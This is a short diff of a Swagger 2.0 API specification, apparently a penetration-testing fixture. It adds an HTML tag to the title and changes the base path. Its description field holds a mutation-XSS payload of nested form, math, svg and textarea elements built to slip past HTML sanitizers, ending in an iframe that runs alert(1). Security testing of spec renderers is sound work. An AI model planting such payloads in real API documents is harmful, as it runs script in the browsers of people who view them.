@@ -1,9 +1,9 @@
 swagger: '2.0'
 info:
-  title: PenTesting
+  title: PenTesting<b>a</b>
   description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script>alert(1)</script>">
   version: production
-basePath: /JSSResource3/
+basePath: /JSSResource4/
 produces:
   - application/xml
   - application/json
